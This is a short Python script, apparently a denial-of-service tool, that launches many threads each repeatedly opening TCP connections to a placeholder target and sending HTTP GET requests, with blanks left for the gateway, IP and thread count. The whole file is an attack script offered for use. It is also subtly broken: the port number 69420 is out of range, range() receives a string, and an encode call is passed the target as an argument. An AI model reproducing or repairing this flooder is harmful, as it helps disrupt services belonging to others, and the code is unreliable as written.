import threading
import socket

target = 'GATEAWAY GOES HERE'
port = 69420
ip = 'IP GOES HERE'

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /"+ target + " HTTP/1.1\r\n").encode('ascii', target), (target, port))
        s.sendto(("HOST: "+ ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

for i in range('thread numbers here'):
    thread = threading.Thread(target=attack)
    thread.start()